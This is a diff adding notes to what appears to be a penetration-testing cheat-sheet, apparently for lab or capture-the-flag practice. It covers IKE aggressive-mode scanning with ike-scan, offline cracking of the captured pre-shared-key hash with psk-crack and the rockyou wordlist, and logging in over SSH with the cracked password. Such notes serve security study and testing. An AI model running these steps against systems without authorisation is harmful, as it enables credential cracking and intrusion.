@@ -15,6 +15,20 @@ nmap $target -Pn -sU -sV -T3 --top-ports 25 -v
 # Usage: nmap <TARGET_IP> -p 22,80 -A
 nmap <TARGET_IP> -p 22,80 -A
 
+
+# if found on udp nmap scan the 500/udp   open   isakmp? (or IKE in general) service, then run:
+#if you don't have it yet, first install:
+sudo apt install ike-scan
+# then run:
+sudo ike-scan -M -A $target
+sudo ike-scan -A --pskcrack $target
+psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
+
+# if you get a password out of the cracked hash then use it to ssh in with:
+ssh [username that you found earlier)@$target
+# and then if you end up needing to crack a hash, remember to unzip your rockyou list before attempting to use it.
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
 # -------------------------
 # HTTP / hosts / basic web checks
 # -------------------------
